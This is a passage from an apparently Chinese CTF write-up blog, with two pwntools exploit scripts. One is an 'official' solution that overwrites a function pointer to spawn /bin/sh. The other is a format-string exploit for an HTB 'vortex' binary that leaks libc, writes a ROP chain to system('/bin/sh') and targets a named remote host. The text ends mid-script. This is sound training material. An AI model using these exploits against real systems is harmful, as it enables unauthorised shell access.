  </li>
  <li>
    <p><strong>潜在的危害</strong>：</p>

    <ul>
      <li>如果数据结构的大小或布局不匹配，可能会访问到无效的内存区域，从而导致程序崩溃或未定义行为。</li>
      <li>在更复杂的程序中，攻击者可以利用此漏洞伪造数据或执行任意代码。</li>
    </ul>
  </li>
</ol>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>官方wp</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="kn">import</span> <span class="n">pwn</span>


<span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">protection</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">REGISTER</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">protection</span><span class="p">)</span>

    <span class="k">return</span>


<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">LOGIN</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>

    <span class="k">return</span>


<span class="k">def</span> <span class="nf">info</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">INFO</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()[</span><span class="mi">4</span><span class="p">:]</span>


<span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">,</span> <span class="n">description</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">UPDATE</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">description</span><span class="p">)</span>

    <span class="k">return</span>


<span class="k">def</span> <span class="nf">logout</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">LOGOUT</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span>


<span class="k">def</span> <span class="nf">exit</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">EXIT</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">IP</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span>
    <span class="n">PORT</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="mi">17172</span>

    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="nf">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

    <span class="c1"># 0000000000402680 T syscall.RawSyscall6
</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">28</span><span class="p">):</span>
        <span class="nf">register</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="s">x_</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">full</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">logout</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

    <span class="nf">register</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">full</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">update</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">pwn</span><span class="p">.</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000000000402680</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
    <span class="nf">logout</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
    <span class="nf">login</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">logout</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

    <span class="c1"># pwn.pause()
</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x400008</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

    <span class="nf">register</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">y</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">full</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="htb-vortex-user"><span class="me-2">HTB-vortex-user</span><a href="#htb-vortex-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>可以设置 env 和查看env, 设置 env 时会记录日志，然后查看日志存在 格式化字符串漏洞</p>

<p>‍</p>

<p>很幸运远程的ubuntu libc 和我本地的是一样的， 我是通过 格式化字符串漏洞 get shell</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="c1"># Define lambda functions for common operations
</span><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="c1"># Context settings
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span> <span class="c1"># info
</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">170</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span>   <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span> <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">CMD</span><span class="p">:</span> <span class="k">return</span> <span class="nf">process</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span> <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">89.169.156.185</span><span class="sh">'</span><span class="p">,</span> <span class="mi">12850</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">AWD</span><span class="p">:</span> <span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
    <span class="sh">'''</span><span class="s">     Usage: python3 exp.py AWD &lt;IP&gt; &lt;PORT&gt;   </span><span class="sh">'''</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./cli</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x000001D4A
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>


<span class="c1">#import socks
#context.proxy = (socks.SOCKS5, '192.168.80.102', 10808)
</span>
<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">l</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"># </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">env</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">n_env</span><span class="o">=</span><span class="sh">''</span><span class="p">,</span><span class="n">value</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"># </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">env</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="sh">'</span><span class="s">set</span><span class="sh">'</span><span class="p">:</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="n">n_env</span><span class="p">)</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">value: </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="n">n_env</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">set_env</span><span class="p">(</span><span class="n">n_env</span><span class="p">,</span><span class="n">value</span><span class="p">):</span>
    <span class="nf">env</span><span class="p">(</span><span class="sh">'</span><span class="s">set</span><span class="sh">'</span><span class="p">,</span><span class="n">n_env</span><span class="p">,</span><span class="n">value</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">get_env</span><span class="p">(</span><span class="n">n_env</span><span class="p">,</span><span class="n">value</span><span class="p">):</span>
    <span class="nf">env</span><span class="p">(</span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="p">,</span><span class="n">n_env</span><span class="p">,</span><span class="n">value</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logs</span><span class="p">(</span><span class="n">pay1</span><span class="o">=</span><span class="sh">''</span><span class="p">,</span><span class="n">pay2</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"># </span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pay1</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span>
        <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">logs</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">s</span><span class="p">(</span><span class="n">pay1</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pay2</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span>
        <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">view</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">s</span><span class="p">(</span><span class="n">pay2</span><span class="p">)</span>

<span class="nf">set_env</span><span class="p">(</span><span class="sh">'</span><span class="s">env1</span><span class="sh">'</span><span class="p">,</span><span class="sa">f</span><span class="sh">'</span><span class="s">-&gt;%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0xb</span><span class="si">}</span><span class="s">$p-&gt;%</span><span class="si">{</span><span class="mi">6</span> <span class="o">+</span> <span class="mh">0x17</span><span class="si">}</span><span class="s">$p</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">logs</span><span class="p">()</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">-&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">-&gt;</span><span class="sh">'</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">172490</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>
<span class="n">poprdi</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">pop rdi;ret</span><span class="sh">'</span><span class="p">)))</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">poprdi</span> <span class="o">+</span> <span class="mi">1</span>

<span class="n">rop</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">rop</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">rop</span><span class="p">)):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
    <span class="k">if</span> <span class="n">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">n</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span> <span class="o">+</span> <span class="mh">0xb</span><span class="si">}</span><span class="s">$hhn</span><span class="sh">'</span> 
    <span class="k">else</span><span class="p">:</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">24</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span> <span class="o">+</span> <span class="mh">0xb</span><span class="si">}</span><span class="s">$hhn</span><span class="sh">'</span>
    <span class="nf">set_env</span><span class="p">(</span><span class="sh">'</span><span class="s">env1</span><span class="sh">'</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">n</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span> <span class="o">+</span> <span class="mh">0x13</span><span class="si">}</span><span class="s">$hhn</span><span class="sh">'</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">24</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span> <span class="o">+</span> <span class="mh">0x13</span><span class="si">}</span><span class="s">$hhn</span><span class="sh">'</span>
    <span class="nf">set_env</span><span class="p">(</span><span class="sh">'</span><span class="s">env1</span><span class="sh">'</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>




<span class="c1">#gdb.attach(io,gdbscript)
</span>
<span class="n">pay1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">logs</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
